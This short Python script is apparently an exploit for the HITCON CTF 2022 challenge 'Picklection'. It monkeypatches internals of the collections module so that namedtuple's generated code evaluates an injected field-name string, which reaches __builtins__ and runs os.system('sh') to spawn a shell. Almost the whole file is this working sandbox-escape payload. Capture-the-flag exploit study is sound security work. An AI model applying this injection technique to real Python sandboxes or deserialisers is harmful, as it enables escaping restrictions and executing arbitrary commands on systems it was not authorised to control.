# HITCON CTF 2022: Picklection
# https://github.com/splitline/My-CTF-Challenges/blob/master/hitcon-ctf/2022/misc/Picklection/release/share/chal.py

from collections import namedtuple, _collections_abc, _sys, namedtuple, Counter, UserString
_collections_abc.__all__ = ["_check_methods", "_type_repr", 'abstractmethod',
                            'map', 'tuple', 'str']
from collections import _check_methods, _type_repr, abstractmethod

s_dummy = UserString('x')
s_dummy.__mro__ = ()

field_names = Counter()

# field_names.replace(',', ' ').split()
UserString.replace = _check_methods
field_names.split = _check_methods
_check_methods.__defaults__ = (abstractmethod,)
abstractmethod.__mro__ = ()

# abstractmethod: basically do nothing
_sys.intern = abstractmethod

_collections_abc.NotImplemented = field_names
_collections_abc.map = _check_methods
_collections_abc.tuple = _type_repr

# if isinstance(obj, type): ...
_collections_abc.type = Counter

field_names.__module__ = 'builtins'
field_names.__qualname__ = [
    'a=[].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh"):0#'
]

# '__name__': f'namedtuple_{typename}'
UserString.__str__ = _type_repr

_collections_abc.str = UserString
from collections import map, tuple, str

namedtuple(s_dummy, s_dummy)
